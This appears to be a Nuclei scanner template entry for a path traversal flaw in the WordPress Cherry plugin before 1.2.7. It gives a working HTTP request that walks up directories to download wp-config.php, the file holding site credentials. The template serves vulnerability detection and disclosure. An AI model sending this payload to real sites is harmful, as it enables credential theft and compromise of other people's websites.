# Nuclei Template: Cherry Plugin < 1.2.7 - Arbitrary File Retrieval and File Upload
**Template ID:** cherry-file-download
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`cherry-file-download.yaml`)

## Vulnerability Information & PoC

## Description
WordPress plugin Cherry < 1.2.7 contains an unauthenticated file upload and download vulnerability, allowing attackers to upload and download arbitrary files. This could result in attacker uploading backdoor shell scripts or downloading the wp-config.php file.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php
```

## References
- https://wpscan.com/vulnerability/90034817-dee7-40c9-80a2-1f1cd1d033ee
- https://github.com/CherryFramework/cherry-plugin
